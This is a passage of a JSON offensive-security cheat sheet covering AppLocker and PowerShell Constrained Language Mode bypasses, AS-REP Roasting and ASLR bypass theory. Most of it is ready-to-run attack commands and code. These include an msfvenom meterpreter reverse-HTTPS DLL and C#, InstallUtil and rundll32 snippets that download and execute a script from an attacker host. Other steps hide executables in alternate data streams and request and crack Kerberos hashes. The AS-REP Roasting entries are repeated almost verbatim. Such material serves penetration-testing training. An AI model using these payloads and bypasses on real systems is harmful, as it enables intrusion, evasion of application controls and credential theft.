            "title": "Rundll32 Execution",
            "codes": [
              {
                "lang": "bash",
                "code": "rundll32.exe payload.dll,EntryPoint"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Create Payload DLL",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f dll -o payload.dll"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If DLL rules aren't enabled (default), arbitrary DLLs can be loaded.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Alternate Data Streams",
        "substeps": [
          {
            "title": "Create ADS",
            "codes": [
              {
                "lang": "bash",
                "code": "type payload.exe > \"C:\\Windows\\Tasks\\legitimate.txt:payload.exe\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Execute from ADS",
            "codes": [
              {
                "lang": "bash",
                "code": "wmic process call create \"C:\\Windows\\Tasks\\legitimate.txt:payload.exe\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "List ADS",
            "codes": [
              {
                "lang": "bash",
                "code": "dir /r C:\\Windows\\Tasks\\"
              },
              {
                "lang": "powershell",
                "code": "Get-Item -Path \"C:\\Windows\\Tasks\\*\" -Stream *"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hide executables in Alternate Data Streams of legitimate files.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Third Party Execution",
        "substeps": [
          {
            "title": "MSBuild Execution",
            "codes": [
              {
                "lang": "bash",
                "code": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "MSBuild Payload File",
            "codes": [
              {
                "lang": "xml",
                "code": "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"Build\">\n    <ClassExample />\n  </Target>\n  <UsingTask TaskName=\"ClassExample\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\">\n    <Task>\n      <Code Type=\"Class\" Language=\"cs\">\n        <![CDATA[\n        using System;\n        using Microsoft.Build.Framework;\n        using Microsoft.Build.Utilities;\n        public class ClassExample : Task, ITask {\n          public override bool Execute() {\n            System.Diagnostics.Process.Start(\"calc.exe\");\n            return true;\n          }\n        }\n        ]]>\n      </Code>\n    </Task>\n  </UsingTask>\n</Project>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "InstallUtil Execution",
            "codes": [
              {
                "lang": "bash",
                "code": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "RegAsm/RegSvcs Execution",
            "codes": [
              {
                "lang": "bash",
                "code": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe /U payload.dll\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe payload.dll"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use trusted applications to execute code.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "LOLBAS Project",
        "url": "https://lolbas-project.github.io/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Default AppLocker rules allow execution from trusted paths. Writable subdirectories may exist.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "AppLocker Fundamentals",
    "title": "AppLocker Configuration",
    "tags": [
      "AppLocker_Bypass",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "AppLocker Service",
        "codes": [
          {
            "lang": "bash",
            "code": "sc query AppIDSvc\nsc start AppIDSvc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Application Identity** service must be running for AppLocker to work.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "View Applied Rules",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-AppLockerPolicy -Local | Format-List"
          },
          {
            "lang": "bash",
            "code": "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "AppLocker PowerShell Bypass",
    "title": "AppLocker PowerShell Bypass",
    "tags": [
      "AppLocker_Bypass",
      "Defense_Evasion",
      "PowerShell",
      "Windows"
    ],
    "steps": [
      {
        "title": "PowerShell Constrained Language Mode",
        "substeps": [
          {
            "title": "Check Language Mode",
            "codes": [
              {
                "lang": "powershell",
                "code": "$ExecutionContext.SessionState.LanguageMode"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "CLM Restrictions",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "CLM restrictions:\n- Cannot use **Add-Type**\n- Cannot access .NET types directly\n- Cannot use COM objects\n- Limited cmdlets available\n- No script block logging bypass",
                "variant": "warning"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Custom Runspaces Bypass",
        "substeps": [
          {
            "title": "C# Custom Runspace",
            "codes": [
              {
                "lang": "csharp",
                "code": "using System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nclass Bypass\n{\n    static void Main()\n    {\n        Runspace rs = RunspaceFactory.CreateRunspace();\n        rs.Open();\n\n        PowerShell ps = PowerShell.Create();\n        ps.Runspace = rs;\n\n        // Full language mode in custom runspace\n        ps.AddScript(\"$ExecutionContext.SessionState.LanguageMode\");\n        var results = ps.Invoke();\n\n        foreach (var result in results)\n        {\n            Console.WriteLine(result);\n        }\n\n        rs.Close();\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Execute Script via Runspace",
            "codes": [
              {
                "lang": "csharp",
                "code": "using System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nclass Bypass\n{\n    static void Main()\n    {\n        Runspace rs = RunspaceFactory.CreateRunspace();\n        rs.Open();\n\n        PowerShell ps = PowerShell.Create();\n        ps.Runspace = rs;\n\n        string script = @\"\n            IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')\n        \";\n\n        ps.AddScript(script);\n        ps.Invoke();\n\n        rs.Close();\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create custom PowerShell runspace that bypasses CLM restrictions.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "PowerShell CLM Bypass Alternatives",
        "substeps": [
          {
            "title": "PowerShell Version 2",
            "codes": [
              {
                "lang": "bash",
                "code": "powershell -version 2 -c \"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')\""
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "PowerShell v2 doesn't support CLM. May not be available on modern systems.",
                "variant": "warning"
              }
            ]
          },
          {
            "title": "Check if PowerShell v2 Available",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Reflective Injection Techniques",
        "substeps": [
          {
            "title": "PSByPassCLM",
            "codes": [
              {
                "lang": "bash",
                "code": "PsBypassCLM.exe -cmd \"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Inject into PowerShell process to bypass CLM.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "PowerShdll",
            "codes": [
              {
                "lang": "bash",
                "code": "rundll32.exe PowerShdll.dll,main -i"
              },
              {
                "lang": "bash",
                "code": "rundll32.exe PowerShdll.dll,main IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Run PowerShell with **rundll32** (no powershell.exe).",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "NoPowerShell",
            "codes": [
              {
                "lang": "bash",
                "code": "NoPowerShell.exe -c \"Get-Process\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": ".NET-based PowerShell implementation.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "InstallUtil CLM Bypass",
        "substeps": [
          {
            "title": "Create Bypass DLL",
            "codes": [
              {
                "lang": "csharp",
                "code": "using System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Configuration.Install;\n\n[System.ComponentModel.RunInstaller(true)]\npublic class Bypass : Installer\n{\n    public override void Uninstall(System.Collections.IDictionary savedState)\n    {\n        Runspace rs = RunspaceFactory.CreateRunspace();\n        rs.Open();\n        PowerShell ps = PowerShell.Create();\n        ps.Runspace = rs;\n        ps.AddScript(\"IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/p.ps1')\");\n        ps.Invoke();\n        rs.Close();\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Execute",
            "codes": [
              {
                "lang": "bash",
                "code": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U Bypass.dll"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Microsoft CLM Documentation",
        "url": "https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**AppLocker** puts PowerShell in Constrained Language Mode (CLM). Restricts dangerous operations like Add-Type, COM objects, .NET types.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "AS-REP Roasting",
    "title": "AS-REP Roasting",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find AS-REP Roastable Accounts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find with Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --asrep"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "AS-REP Roast with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt"
          },
          {
            "lang": "powershell",
            "code": "# Target specific user\n.\\Rubeus.exe asreproast /user:<Username> /format:hashcat /outfile:asrep_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "AS-REP Roast from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetNPUsers <Domain>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.txt"
          },
          {
            "lang": "bash",
            "code": "# With credentials (finds vulnerable users automatically)\nimpacket-GetNPUsers <Domain>/<Username>:<Password> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Can be done without credentials - just need valid usernames.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "AS-REP Roast with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <Username> -p '<Password>' --asreproast asrep.txt"
          },
          {
            "lang": "bash",
            "code": "# Without credentials (need userlist)\nnxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Find with nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<Username>' -p '<Password>' --asreproast"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 18200 asrep.txt rockyou.txt -r /opt/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Validate Cracked Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u <Username> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check for admin access across subnet\nnxc smb 192.168.1.0/24 -u <Username> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check WinRM access\nnxc winrm <TargetIP> -u <Username> -p '<CrackedPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks AS-REP Roasting",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Target accounts with \"Do not require Kerberos preauthentication\" enabled. Can be done without credentials if you have a list of usernames.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "AS-REP Roasting",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "AS-REP Roasting - No Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetNPUsers <Domain>/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Target users with \"Do not require Kerberos preauthentication\" enabled.\nThese users' password hashes can be requested WITHOUT knowing their password."
          }
        ]
      },
      {
        "title": "AS-REP Roasting - With Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetNPUsers <Domain>/<User>:<Pass> -request -format hashcat -outputfile asrep.txt -dc-ip <DC_IP>"
          },
          {
            "lang": "powershell",
            "code": "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "With valid credentials, query LDAP to find all AS-REP roastable users automatically."
          }
        ]
      },
      {
        "title": "AS-REP Roasting - Rubeus (Windows)",
        "codes": [
          {
            "lang": "powershell",
            "code": "Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat\nRubeus.exe asreproast /format:john /outfile:hash.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack AS-REP Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\njohn --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use AS-REP Hash with SMBClient",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient '\\\\<TargetIP>\\<Share>' -L <DC_IP> -W <Domain> -U <User>%<NTHash> --pw-nt-hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Access SMB shares using NT hash from cracked AS-REP roasted user."
          }
        ]
      },
      {
        "title": "Targeted AS-REP Roasting",
        "substeps": [
          {
            "title": "Enable ASREPRoast Vulnerability",
            "codes": [
              {
                "lang": "powershell",
                "code": "Set-ADAccountControl -Identity <Username> -DoesNotRequirePreAuth $true"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Disables Kerberos pre-authentication for a user, making the account vulnerable to AS-REP Roasting.\nRequires Domain Admin, Account Operator, or delegated permissions.\n**To remediate:** Set `-DoesNotRequirePreAuth $false`"
              }
            ]
          },
          {
            "title": "Using UserAccountControl",
            "codes": [
              {
                "lang": "powershell",
                "code": "$uac = (Get-ADUser -Identity <TargetUser> -Properties UserAccountControl).UserAccountControl\n$newUac = $uac -bor 0x400000\nSet-ADUser -Identity <TargetUser> -UserAccountControl $newUac"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Perform AS-REP Roast",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-GetNPUsers <Domain>/ -dc-ip <DC_IP> -usersfile target_user.txt -format hashcat -outputfile target_hash.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Crack Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 18200 target_hash.txt <Wordlist>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Revert Pre-Auth Setting",
            "codes": [
              {
                "lang": "powershell",
                "code": "Set-ADAccountControl -Identity <TargetUser> -DoesNotRequirePreAuth $false"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you have GenericWrite/GenericAll on a user, disable their Kerberos pre-authentication."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "AS-REP Roasting",
    "title": "AS-REP Roasting",
    "tags": [
      "AS-REP_Roasting",
      "Active_Directory",
      "Credential_Access",
      "Hashcat",
      "Impacket",
      "Kerberos",
      "Password_Attack",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Find AS-REP Roastable Accounts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find with Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --asrep"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "AS-REP Roast with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt"
          },
          {
            "lang": "powershell",
            "code": "# Target specific user\n.\\Rubeus.exe asreproast /user:<Username> /format:hashcat /outfile:asrep_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "AS-REP Roast from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetNPUsers <Domain>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.txt"
          },
          {
            "lang": "bash",
            "code": "# With credentials (finds vulnerable users automatically)\nimpacket-GetNPUsers <Domain>/<Username>:<Password> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Can be done without credentials - just need valid usernames.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "AS-REP Roast with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <Username> -p '<Password>' --asreproast asrep.txt"
          },
          {
            "lang": "bash",
            "code": "# Without credentials (need userlist)\nnxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Find with nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<Username>' -p '<Password>' --asreproast"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Crack Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 18200 asrep.txt rockyou.txt -r /opt/hashcat/rules/best64.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Validate Cracked Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u <Username> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check for admin access across subnet\nnxc smb 192.168.1.0/24 -u <Username> -p '<CrackedPassword>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Check WinRM access\nnxc winrm <TargetIP> -u <Username> -p '<CrackedPassword>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks AS-REP Roasting",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Target accounts with \"Do not require Kerberos preauthentication\" enabled. Can be done without credentials if you have a list of usernames.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "ASLR Theory",
    "title": "ASLR Theory",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "ASLR Overview [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How ASLR protects against exploitation:\n- **Randomized on boot**: DLL base addresses change each reboot\n- **Randomized per-process**: Heap, stack, PEB locations vary per process\n- **Effect**: Hardcoded addresses no longer reliable\n- **Limitation**: Limited entropy on 32-bit systems",
            "variant": "info"
          }
        ]
      },
      {
        "title": "What ASLR Randomizes [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Randomized:\n- Executable image base (if compiled with /DYNAMICBASE)\n- DLL base addresses (if compiled with /DYNAMICBASE)\n- Stack base address\n- Heap base address\n- PEB/TEB locations\n\nNot Randomized:\n- Modules without /DYNAMICBASE\n- Some legacy system DLLs\n- Memory at fixed addresses (rare)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Memory regions affected by ASLR."
          }
        ]
      },
      {
        "title": "Check ASLR Status",
        "codes": [
          {
            "lang": "text",
            "code": "; In WinDbg\n!mona modules                 ; Shows ASLR/Rebase column\n\n; In IDA\nEdit -> Segments -> Rebase program (check if rebased)\n\n; PE Header check\ndumpbin /headers <Module.dll> | findstr \"DYNAMIC\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine if module has ASLR enabled."
          }
        ]
      },
      {
        "title": "Check Module ASLR with Mona",
        "codes": [
          {
            "lang": "text",
            "code": "!mona modules\n\n; Output columns:\n; Rebase | SafeSEH | ASLR | NXCompat | OS Dll | Module\n; False    False     False   False     False    vulnapp.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "List modules and their protection status using **mona.py**."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Look for modules with **ASLR=False** for reliable gadgets.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "ASLR Entropy [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Windows 32-bit:\n- Image base: ~8 bits entropy (256 possible locations)\n- Stack: ~14 bits entropy\n- Heap: ~5 bits entropy\n\nWindows 64-bit:\n- Image base: ~17-19 bits entropy\n- Stack: ~17 bits entropy\n- Significantly harder to brute force"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Amount of randomization provided."
          }
        ]
      },
      {
        "title": "ASLR Bypass Strategies [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Techniques to defeat ASLR:\n- **Non-ASLR module**: Find loaded module without ASLR, use its addresses\n- **Information disclosure**: Leak memory address, calculate base\n- **Partial overwrite**: Overwrite only low bytes (not randomized)\n- **Brute force**: Feasible on 32-bit with low entropy (crash recovery needed)\n- **Heap spray**: Fill memory with payload, increase hit probability",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Find Non-ASLR Modules",
        "codes": [
          {
            "lang": "text",
            "code": "!mona modules -cm aslr=false\n\n; Common non-ASLR scenarios:\n; - Legacy applications\n; - Third-party DLLs\n; - Older runtime libraries"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Identify modules without ASLR protection."
          }
        ]
      },
      {
        "title": "Information Disclosure Approach [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "1. Find vulnerability that leaks memory contents\n2. Leak pointer to known structure (e.g., vtable, return address)\n3. Calculate module base from leaked address\n4. Use calculated base for ROP gadgets\n5. Execute exploit with correct addresses"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Leak address to defeat ASLR."
          }
        ]
      },
      {
        "title": "Partial Overwrite Technique [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "; Low 16 bits of addresses are not randomized\n; If overwriting return address:\n\nOriginal return: 0x12345678\nPartial overwrite: 0x????56AB\n\n; Overwrites 0x5678 -> 0x56AB\n; Only need to know offset within page"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Exploit without knowing full address."
          }
        ]
      },
      {
        "title": "High Entropy ASLR (Windows 8+) [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enhanced ASLR on modern Windows:\n- **Bottom-up randomization**: Affects VirtualAlloc, MapViewOfFile\n- **High entropy 64-bit**: 24 bits for images, 33 bits for stack\n- **Force ASLR**: Even non-ASLR binaries can be randomized",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Check Process Mitigations",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ProcessMitigation -Name <Process>\nGet-ProcessMitigation -System"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View ASLR settings for process."
          }
        ]
      },
      {
        "title": "Combining with DEP Bypass [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Scenario: DEP + ASLR enabled\n1. Find information disclosure vulnerability\n2. Leak module base address\n3. Calculate ROP gadget addresses\n4. Build ROP chain with correct addresses\n5. Execute ROP to disable DEP\n6. Jump to shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "ASLR and DEP together require both bypasses."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft ASLR",
        "url": "https://learn.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10"
      }
    ],
    "foundational": true,
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**ASLR** (Address Space Layout Randomization) randomizes memory addresses to prevent reliable exploitation."
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Attack Chains",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
